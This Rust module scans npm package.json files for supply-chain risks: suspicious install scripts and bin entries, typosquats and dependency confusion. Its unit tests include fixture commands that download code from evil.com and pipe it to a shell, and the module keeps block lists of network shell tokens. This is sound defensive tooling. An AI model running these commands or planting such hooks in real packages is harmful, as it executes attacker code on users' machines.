use serde_json::Value;
use std::collections::HashMap;
use std::path::Path;

/// A finding produced by package.json manifest analysis.
#[derive(Debug, Clone)]
pub struct ManifestFinding {
    pub rule_id: String,
    pub name: String,
    pub description: String,
    pub severity: String,
    pub file: String,
    pub detail: String,
}

/// Popular packages used as the reference set for typosquat detection.
const POPULAR_PACKAGES: &[&str] = &[
    "express",
    "react",
    "lodash",
    "axios",
    "chalk",
    "commander",
    "debug",
    "moment",
    "request",
    "underscore",
    "webpack",
    "babel",
    "typescript",
    "eslint",
    "prettier",
    "next",
    "vue",
    "angular",
    "jquery",
    "jest",
    "mocha",
    "dotenv",
    "cors",
    "body-parser",
    "mongoose",
    "sequelize",
    "pg",
    "mysql",
    "redis",
    "node-fetch",
    "form-data",
    "aws-sdk",
    "firebase",
    "graphql",
    "socket.io",
    "passport",
    "jsonwebtoken",
    "bcrypt",
    "helmet",
    "morgan",
    "winston",
    "pm2",
    "gulp",
    "rollup",
    "vite",
    "esbuild",
    "parcel",
    "svelte",
    "nuxt",
    "gatsby",
    "koa",
    "fastify",
    "hapi",
    "nest",
];

/// Shell-related tokens that are suspicious inside install scripts.
const SUSPICIOUS_COMMANDS: &[&str] = &[
    "curl", "wget", "bash", "node", "eval", "base64", "sh ", "sh\t", "/bin/sh", "/bin/bash",
    "powershell", "cmd.exe", "nc ", "netcat", "python", "ruby", "perl",
];

/// Install-lifecycle script keys that are commonly abused.
const INSTALL_SCRIPT_KEYS: &[&str] = &["preinstall", "install", "postinstall", "prepare", "preuninstall"];

/// Analyze a package.json file at the given path and return all findings.
///
/// Returns an empty `Vec` if the file cannot be read or is not valid JSON.
/// Non-fatal parse issues are silently skipped so the scanner can continue.
pub fn analyze(path: &Path) -> Result<Vec<ManifestFinding>, ManifestError> {
    let contents = std::fs::read_to_string(path).map_err(|e| ManifestError::Io {
        path: path.display().to_string(),
        source: e,
    })?;

    analyze_contents(&contents, &path.display().to_string())
}

/// Analyze raw package.json contents. `file_label` is used in findings for the
/// `file` field (typically the file path).
pub fn analyze_contents(
    contents: &str,
    file_label: &str,
) -> Result<Vec<ManifestFinding>, ManifestError> {
    let root: Value =
        serde_json::from_str(contents).map_err(|e| ManifestError::InvalidJson {
            file: file_label.to_string(),
            source: e,
        })?;

    let obj = root
        .as_object()
        .ok_or_else(|| ManifestError::NotAnObject {
            file: file_label.to_string(),
        })?;

    let mut findings = Vec::new();

    check_install_scripts(obj, file_label, &mut findings);
    check_bin_entries(obj, file_label, &mut findings);

    let all_deps = collect_dependency_names(obj);
    check_typosquats(&all_deps, file_label, &mut findings);
    check_dependency_confusion(&all_deps, file_label, &mut findings);

    Ok(findings)
}

// ---------------------------------------------------------------------------
// Rule 1: Suspicious install scripts
// ---------------------------------------------------------------------------

fn check_install_scripts(
    obj: &serde_json::Map<String, Value>,
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    let scripts = match obj.get("scripts").and_then(|v| v.as_object()) {
        Some(s) => s,
        None => return,
    };

    for &key in INSTALL_SCRIPT_KEYS {
        if let Some(Value::String(cmd)) = scripts.get(key) {
            let lower = cmd.to_ascii_lowercase();
            for &token in SUSPICIOUS_COMMANDS {
                if lower.contains(token) {
                    findings.push(ManifestFinding {
                        rule_id: "MANIFEST-001".to_string(),
                        name: "Suspicious install script".to_string(),
                        description: format!(
                            "The \"{key}\" script contains a suspicious command \
                             (\"{token}\") that may indicate a supply chain attack.",
                        ),
                        severity: "critical".to_string(),
                        file: file.to_string(),
                        detail: format!("{key}: {cmd}"),
                    });
                    // One finding per script key is enough — avoid duplicating
                    // for every token that matches inside the same command.
                    break;
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 4: Suspicious bin entries
// ---------------------------------------------------------------------------

/// Patterns in bin entry paths/values that suggest malicious intent.
const SUSPICIOUS_BIN_PATTERNS: &[&str] = &[
    "node -e",
    "eval",
    "curl",
    "wget",
    "bash -c",
    "base64",
    "%2f",
    "%2F",
    "\\x",
    "\\u00",
];

fn check_bin_entries(
    obj: &serde_json::Map<String, Value>,
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    let bin_value = match obj.get("bin") {
        Some(v) => v,
        None => return,
    };

    // "bin" can be a string (single entry) or an object of name -> path mappings.
    let entries: Vec<(&str, &str)> = match bin_value {
        Value::String(s) => vec![("<default>", s.as_str())],
        Value::Object(map) => map
            .iter()
            .filter_map(|(k, v)| v.as_str().map(|s| (k.as_str(), s)))
            .collect(),
        _ => return,
    };

    for (bin_name, bin_path) in &entries {
        let lower = bin_path.to_ascii_lowercase();
        for &pattern in SUSPICIOUS_BIN_PATTERNS {
            if lower.contains(&pattern.to_ascii_lowercase()) {
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-004".to_string(),
                    name: "Suspicious bin entry".to_string(),
                    description: format!(
                        "The bin entry \"{bin_name}\" points to a path containing \
                         a suspicious pattern (\"{pattern}\") that may indicate a \
                         supply chain attack.",
                    ),
                    severity: "high".to_string(),
                    file: file.to_string(),
                    detail: format!("bin.{bin_name}: {bin_path}"),
                });
                // One finding per bin entry is enough.
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 2: Typosquat detection via Levenshtein distance
// ---------------------------------------------------------------------------

/// Compute the Levenshtein edit distance between two strings.
fn levenshtein(a: &str, b: &str) -> usize {
    let a_len = a.len();
    let b_len = b.len();

    if a_len == 0 {
        return b_len;
    }
    if b_len == 0 {
        return a_len;
    }

    // Single-row optimisation: keep only the previous row.
    let mut prev: Vec<usize> = (0..=b_len).collect();
    let mut curr = vec![0usize; b_len + 1];

    for (i, ca) in a.chars().enumerate() {
        curr[0] = i + 1;
        for (j, cb) in b.chars().enumerate() {
            let cost = if ca == cb { 0 } else { 1 };
            curr[j + 1] = (prev[j] + cost)
                .min(prev[j + 1] + 1)
                .min(curr[j] + 1);
        }
        std::mem::swap(&mut prev, &mut curr);
    }

    prev[b_len]
}

/// Maximum edit distance for a pair to be considered a potential typosquat.
fn typosquat_threshold(popular_name: &str, dep_name: &str) -> usize {
    let min_len = popular_name.len().min(dep_name.len());
    if min_len <= 5 {
        1
    } else {
        2
    }
}

fn check_typosquats(
    dep_names: &[String],
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    for dep in dep_names {
        // Strip optional scope for comparison (e.g. "@evil/lodash" -> "lodash").
        let bare = dep
            .strip_prefix('@')
            .and_then(|s| s.split_once('/'))
            .map(|(_, name)| name)
            .unwrap_or(dep.as_str());

        // Very short bare names collide too easily — skip them.
        if bare.len() < 4 {
            continue;
        }

        // Skip exact matches — those are the real packages.
        if POPULAR_PACKAGES.contains(&bare) {
            continue;
        }

        for &popular in POPULAR_PACKAGES {
            let threshold = typosquat_threshold(popular, bare);
            let dist = levenshtein(bare, popular);
            if dist > 0 && dist <= threshold {
                let severity = if dist == 1 { "high" } else { "medium" };
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-002".to_string(),
                    name: "Potential typosquat dependency".to_string(),
                    description: format!(
                        "Dependency \"{dep}\" is suspiciously similar to the popular \
                         package \"{popular}\" (edit distance {dist}).",
                    ),
                    severity: severity.to_string(),
                    file: file.to_string(),
                    detail: format!("{dep} ~ {popular} (distance {dist})"),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 3: Dependency confusion risk
// ---------------------------------------------------------------------------

fn check_dependency_confusion(
    dep_names: &[String],
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    // Collect scoped package base names and check if an unscoped version of the
    // same name also appears. That is a classic dependency confusion setup.
    let mut scoped_bases: HashMap<&str, &str> = HashMap::new(); // base -> full scoped name
    let mut unscoped: Vec<&str> = Vec::new();

    for dep in dep_names {
        if let Some(rest) = dep.strip_prefix('@') {
            if let Some((scope, base)) = rest.split_once('/') {
                // @types/* packages are TypeScript type definitions, always
                // paired with the unscoped package — not confusion risk.
                if scope == "types" {
                    continue;
                }
                scoped_bases.insert(base, dep.as_str());
            }
        } else {
            unscoped.push(dep.as_str());
        }
    }

    // Flag any unscoped name that also appears as a scoped package base name.
    for name in &unscoped {
        if let Some(scoped) = scoped_bases.get(name) {
            findings.push(ManifestFinding {
                rule_id: "MANIFEST-003".to_string(),
                name: "Dependency confusion risk".to_string(),
                description: format!(
                    "Both the scoped package \"{scoped}\" and the unscoped package \
                     \"{name}\" are listed as dependencies. This pattern is a common \
                     indicator of dependency confusion attacks.",
                ),
                severity: "high".to_string(),
                file: file.to_string(),
                detail: format!("{scoped} vs {name}"),
            });
        }
    }

    // Also flag private-looking scoped packages whose base name matches a
    // popular public package — an attacker might publish the unscoped version.
    for &popular in POPULAR_PACKAGES {
        if let Some(scoped) = scoped_bases.get(popular) {
            // Already reported above if both exist; only flag solo scoped ones here.
            if !unscoped.contains(&popular) {
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-003".to_string(),
                    name: "Dependency confusion risk".to_string(),
                    description: format!(
                        "Scoped package \"{scoped}\" shares its base name with the popular \
                         public package \"{popular}\". If the scope is private, an attacker \
                         could publish a higher-version unscoped \"{popular}\" to hijack installs.",
                    ),
                    severity: "medium".to_string(),
                    file: file.to_string(),
                    detail: format!("{scoped} shadows {popular}"),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Collect all dependency names from every dependency-related key.
fn collect_dependency_names(obj: &serde_json::Map<String, Value>) -> Vec<String> {
    let dep_keys = [
        "dependencies",
        "devDependencies",
        "peerDependencies",
        "optionalDependencies",
        "bundledDependencies",
        "bundleDependencies",
    ];

    let mut names = Vec::new();

    for key in &dep_keys {
        if let Some(Value::Object(deps)) = obj.get(*key) {
            for name in deps.keys() {
                names.push(name.clone());
            }
        }
        // bundledDependencies can also be an array of strings.
        if let Some(Value::Array(arr)) = obj.get(*key) {
            for item in arr {
                if let Value::String(s) = item {
                    names.push(s.clone());
                }
            }
        }
    }

    // Deduplicate while preserving order.
    let mut seen = std::collections::HashSet::new();
    names.retain(|n| seen.insert(n.clone()));

    names
}

// ---------------------------------------------------------------------------
// Error type
// ---------------------------------------------------------------------------

/// Errors that can occur during manifest analysis.
#[derive(Debug)]
pub enum ManifestError {
    Io {
        path: String,
        source: std::io::Error,
    },
    InvalidJson {
        file: String,
        source: serde_json::Error,
    },
    NotAnObject {
        file: String,
    },
}

impl std::fmt::Display for ManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ManifestError::Io { path, source } => {
                write!(f, "cannot read {path}: {source}")
            }
            ManifestError::InvalidJson { file, source } => {
                write!(f, "invalid JSON in {file}: {source}")
            }
            ManifestError::NotAnObject { file } => {
                write!(f, "{file}: top-level value is not a JSON object")
            }
        }
    }
}

impl std::error::Error for ManifestError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            ManifestError::Io { source, .. } => Some(source),
            ManifestError::InvalidJson { source, .. } => Some(source),
            ManifestError::NotAnObject { .. } => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_suspicious_postinstall() {
        let pkg = r#"{
            "name": "evil-pkg",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | bash"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "MANIFEST-001");
        assert_eq!(findings[0].severity, "critical");
    }

    #[test]
    fn ignores_safe_scripts() {
        let pkg = r#"{
            "name": "safe-pkg",
            "scripts": {
                "postinstall": "echo done",
                "test": "jest"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn detects_typosquat() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "loadsh": "^4.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let typo = findings.iter().find(|f| f.rule_id == "MANIFEST-002");
        assert!(typo.is_some(), "should detect 'loadsh' as typosquat of 'lodash'");
    }

    #[test]
    fn does_not_flag_exact_popular_name() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "axios": "^1.0.0",
                "react": "^18.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let typo = findings.iter().find(|f| f.rule_id == "MANIFEST-002");
        assert!(typo.is_none(), "exact matches should not be flagged");
    }

    #[test]
    fn detects_dependency_confusion() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "@myorg/utils": "^1.0.0",
                "utils": "^2.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let confusion = findings.iter().find(|f| f.rule_id == "MANIFEST-003");
        assert!(confusion.is_some(), "should detect dependency confusion risk");
        assert_eq!(confusion.unwrap().severity, "high");
    }

    #[test]
    fn detects_scoped_shadow_of_popular_package() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "@internal/lodash": "^1.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let shadow = findings
            .iter()
            .find(|f| f.rule_id == "MANIFEST-003" && f.detail.contains("shadows"));
        assert!(shadow.is_some(), "should flag scoped shadow of popular package");
        assert_eq!(shadow.unwrap().severity, "medium");
    }

    #[test]
    fn levenshtein_basic() {
        assert_eq!(levenshtein("", ""), 0);
        assert_eq!(levenshtein("abc", "abc"), 0);
        assert_eq!(levenshtein("abc", "ab"), 1);
        assert_eq!(levenshtein("kitten", "sitting"), 3);
        assert_eq!(levenshtein("axois", "axios"), 2);
        assert_eq!(levenshtein("recat", "react"), 2);
    }

    #[test]
    fn handles_invalid_json() {
        let result = analyze_contents("not json", "bad.json");
        assert!(result.is_err());
    }

    #[test]
    fn handles_non_object_json() {
        let result = analyze_contents("[1,2,3]", "array.json");
        assert!(result.is_err());
    }

    #[test]
    fn handles_empty_package() {
        let findings = analyze_contents("{}", "empty.json").unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn detects_suspicious_bin_string() {
        let pkg = r#"{
            "name": "evil-cli",
            "bin": "node -e \"require('child_process').exec('bad')\""
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(bin_finding.is_some(), "should detect suspicious bin string");
        assert_eq!(bin_finding.unwrap().severity, "high");
    }

    #[test]
    fn detects_suspicious_bin_object() {
        let pkg = r#"{
            "name": "evil-cli",
            "bin": {
                "my-tool": "./scripts/setup.sh",
                "sneaky": "bash -c 'curl http://evil.com | sh'"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == "MANIFEST-004")
            .collect();
        assert!(
            !bin_findings.is_empty(),
            "should detect suspicious bin object entry"
        );
        // The "sneaky" entry should be flagged; "my-tool" is benign.
        assert!(
            bin_findings.iter().any(|f| f.detail.contains("sneaky")),
            "should flag the sneaky bin entry"
        );
    }

    #[test]
    fn ignores_safe_bin_entries() {
        let pkg = r#"{
            "name": "safe-cli",
            "bin": {
                "my-cli": "./bin/cli.js"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(bin_finding.is_none(), "safe bin entries should not be flagged");
    }

    #[test]
    fn detects_encoded_bin_path() {
        let pkg = r#"{
            "name": "encoded-cli",
            "bin": {
                "tool": "./bin/run%2Fsetup"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(
            bin_finding.is_some(),
            "should detect encoded characters in bin path"
        );
    }
}
